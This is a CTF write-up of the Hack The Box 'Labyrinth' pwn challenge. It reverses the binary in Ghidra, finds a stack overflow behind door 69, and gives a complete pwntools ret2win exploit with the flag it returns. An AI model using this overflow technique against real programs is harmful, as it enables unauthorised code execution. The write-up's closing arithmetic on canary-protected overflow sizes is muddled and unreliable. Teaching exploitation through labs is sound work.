---
title: 'Labyrinth'
target: 'Hack The Box — Labyrinth'
difficulty: 'easy'
date: 2025-08-29
summary: 'A pwn challenge — given a 64-bit ELF binary with no canary and no PIE, connecting via netcat to a labyrinth with 100 doors, reverse engineering the binary in Ghidra to find that door 69 triggers a second input vulnerable to buffer overflow (fgets reading 0x44 bytes into a 0x30-byte buffer), locating the escape_plan function that reads flag.txt, and writing a pwntools exploit that overflows the stack to redirect execution to escape_plan.'
role: 'appsec'
tags: ['pwn', 'buffer-overflow', 'binary-exploitation', 'ghidra', 'reverse-engineering', 'pwntools', 'stack-overflow', 'elf', 'checksec', 'ret2win']
problem: 'A 64-bit ELF binary (labyrinth) is provided along with glibc libraries and a test flag.txt. The binary presents 100 doors to choose from, and choosing wrong prints "YOU FAILED TO ESCAPE!" The goal is to reverse engineer the binary to find the correct door and exploit a vulnerability to reach a hidden function that prints the flag.'
action: 'Ran checksec on the binary — Full RELRO, no canary, NX enabled, no PIE. Connected to the remote instance via netcat and observed the door selection interface. Loaded the binary into Ghidra and decompiled the main function, which revealed that door 69 (or 069) passes a strncmp check and triggers a second fgets call that reads up to 0x44 (68) bytes into a buffer only 0x30 (48) bytes deep — a classic stack buffer overflow. Found a separate escape_plan function that opens and prints flag.txt but is never called from main. Used objdump to locate escape_plan at address 0x401256. Wrote a pwntools exploit that sends 69 as the door choice, then overflows the buffer with 0x30 bytes of padding, a crafted base pointer pointing into .bss+0x200, and the address of escape_plan as the return address.'
outcome: 'The exploit successfully redirected execution to escape_plan, which printed the flag HTB{3sc4p3_fr0m_4b0v3}. A straightforward ret2win buffer overflow exploit with no canary and no PIE to complicate the payload.'
draft: false
---

## Background

Labyrinth is a binary exploitation challenge from the HTB CTF pwn category. The binary presents a themed puzzle — 100 doors in a labyrinth — but the real challenge is reverse engineering the binary to find the correct door, identifying the buffer overflow in the second input, and redirecting execution to a function that was never meant to be called. It's a clean ret2win scenario with helpful security mitigations turned off.

---

## Binary security

The challenge provides the `labyrinth` ELF binary along with `glibc` libraries and a local `flag.txt` for testing. Running `checksec` reveals the security posture:

**Full RELRO** — the GOT is read-only, so no GOT overwrite attacks. **No canary** — no stack protection, meaning buffer overflows won't be detected. **NX enabled** — the stack is non-executable, so no shellcode injection. **No PIE** — the binary loads at a fixed address, meaning function addresses are predictable and constant across runs.

No canary and no PIE is the combination that makes a simple ret2win exploit possible — overflow the buffer without detection, and jump to a known address.

---

## The labyrinth

Connecting to the remote instance with `nc 94.237.52.170 56514` presents an ASCII art labyrinth and 100 doors to choose from.

![Kali terminal connected via netcat showing an ASCII art labyrinth with a stick figure, Select door prompt, and Door 001 through Door 100 listed in rows of 10 with a >> input prompt.](/writeups/htb-labyrinth/01-labyrinth-doors.png)

Picking a random door — say, 037 — results in immediate failure:

![Same labyrinth interface after entering 037 at the prompt, with red text reading [-] YOU FAILED TO ESCAPE!](/writeups/htb-labyrinth/02-failed-escape.png)

The binary doesn't give any feedback about which door is correct. Time to look at the code.

---

## Reversing main in Ghidra

Loading the binary into Ghidra and decompiling the `main` function reveals the door selection logic:

![Ghidra CodeBrowser showing the labyrinth binary with the Symbol Tree listing main and local variables on the left, assembly listing in the centre, and the Decompile panel on the right showing the main function with a for loop printing doors, fgets reading input, strncmp comparing against 69 and 069, an fwrite with a message about flying like a bird, a second fgets reading 0x44 bytes, and the YOU FAILED TO ESCAPE fprintf at LAB_004015da.](/writeups/htb-labyrinth/03-ghidra-main.png)

The key logic: after printing the 100 doors, `fgets` reads 5 bytes of input into `local_18`. The input is compared against `"69"` and `"069"` using `strncmp`. If neither matches, execution jumps straight to the failure message. If the input is 69, the program prints a message about seeing writing on the wall — "Fly like a bird and be free!" — and asks if you'd like to change your door choice. Then comes the vulnerability:

```c
fgets((char *)&local_38, 0x44, stdin);
```

This reads up to **0x44 (68) bytes** into `local_38`, which is a buffer at offset `0x30` from the base pointer — only **48 bytes** deep. That's 20 bytes of overflow past the buffer, enough to overwrite the saved base pointer and the return address on the stack.

---

## The escape_plan function

Browsing the other functions in Ghidra reveals `escape_plan` — a function that is never called from `main` but contains exactly what we need:

![Ghidra CodeBrowser showing the escape_plan function decompilation — it calls fwrite with a congratulations message, opens flag.txt with open(), checks for errors with perror, then reads and prints the flag character by character using read() and fputc() in a while loop, and closes the file descriptor.](/writeups/htb-labyrinth/04-ghidra-escape-plan.png)

```c
void escape_plan(void) {
    ssize_t sVar1;
    char local_d;
    int local_c;

    putchar(10);
    fwrite(&DAT_00402018, 1, 0x1f0, stdout);
    fprintf(stdout,
        "\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s\n",
        &DAT_0040220e, &DAT_00402209);
    local_c = open("./flag.txt", 0);
    if (local_c < 0) {
        perror("\nError opening flag.txt, please contact an Administrator.\n\n");
        exit(1);
    }
    while (true) {
        sVar1 = read(local_c, &local_d, 1);
        if (sVar1 < 1) break;
        fputc((int)local_d, stdout);
    }
    close(local_c);
    return;
}
```

The function opens `flag.txt`, reads it character by character, and prints it to stdout. This is the target — redirect execution here and the flag prints itself. The address of `escape_plan` can be found with `objdump -d ./labyrinth | grep escape` — it lives at `0x401256`. Since PIE is disabled, this address is fixed.

---

## The exploit

The overflow is straightforward. The buffer `local_38` sits at offset `0x30` from the base pointer. After the buffer comes the saved `RBP` (8 bytes), then the return address (8 bytes). The exploit needs to:

1. Send `69` to pass the door check
2. Send `0x30` bytes of padding to fill the buffer, then a valid pointer for `RBP` (pointing somewhere writable like `.bss + 0x200`), then the address of `escape_plan` to overwrite the return address

```python
from pwn import *

exe = ELF("/home/kali/Downloads/labyrinth/labyrinth")
libc = ELF("/home/kali/Downloads/labyrinth/libc.so.6")
ld = ELF("/home/kali/Downloads/labyrinth/ld-linux-x86-64.so.2")

context.binary = exe

host = '94.237.52.170'
port = 56514
r = remote(host, port)
r.sendline(b'69')

addr = 0x0000000000401256
payload = b'a' * 0x30 + p64(exe.bss() + 0x200) + p64(addr)

r.sendline(payload)
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```

The payload breaks down as: `0x30` bytes of `'a'` to fill the buffer, `p64(exe.bss() + 0x200)` as a valid writable address for the saved base pointer (pointing into the `.bss` section with a 512-byte offset to avoid clobbering anything), and `p64(addr)` to overwrite the return address with `escape_plan`.

Running the exploit:

![Kali terminal running python3 exploit.py showing checksec output for the labyrinth binary (Full RELRO, No canary, NX enabled, No PIE), libc.so.6 (Partial RELRO, Canary found, NX enabled, PIE enabled), and ld-linux (Partial RELRO, No canary, NX enabled, PIE enabled), followed by Opening connection to 94.237.52.170 on port 56514 Done, then Flag arrow HTB{3sc4p3_fr0m_4b0v3}, and Closed connection.](/writeups/htb-labyrinth/05-exploit-flag.png)

The flag: **HTB{3sc4p3_fr0m_4b0v3}**

---

## What I took from this

The challenge is a textbook ret2win — a buffer overflow where the goal is to redirect execution to an existing function that was never meant to be called. The absence of both stack canaries and PIE makes this possible in the simplest way: no canary means the overflow isn't detected, and no PIE means the target function's address is known at compile time and doesn't change between runs. With both of those mitigations enabled, this exact exploit wouldn't work — you'd need a canary leak and an address leak before you could build the payload.

The `fgets` reading 0x44 bytes into a 0x30-byte buffer is a deliberate vulnerability, but it mirrors real bugs where developers miscalculate buffer sizes or use a hardcoded size that doesn't match the actual allocation. The overflow is only 20 bytes — just enough for RBP and RIP on a 64-bit system. In a real-world scenario with canaries enabled, this would need to be at least 28 bytes (8 for the canary, 8 for RBP, 8 for RIP plus the canary value itself), and the buffer wouldn't be large enough.

The `.bss + 0x200` trick for the saved base pointer is worth noting. When overwriting the return address, you also clobber the saved RBP. If the overwritten RBP points to an invalid or non-writable address, the program can crash before reaching the return instruction. Pointing it into `.bss` — a writable section that always exists in the binary — with an offset to avoid the start of the section gives a safe landing zone. This is a common pattern in ret2win exploits where the function prologue of the target function will push and pop RBP.
